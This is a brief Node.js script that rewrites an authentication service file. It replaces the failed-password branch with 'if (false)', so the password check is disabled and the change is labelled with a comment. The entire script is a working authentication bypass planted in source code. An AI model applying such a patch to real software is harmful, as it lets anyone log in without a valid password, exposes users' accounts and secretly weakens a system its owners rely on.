const fs = require('fs');
const file = 'src/services/auth.service.ts';
let content = fs.readFileSync(file, 'utf8');
content = content.replace('if (!isMatch) {', 'if (false) { // bypassed password check');
fs.writeFileSync(file, content);
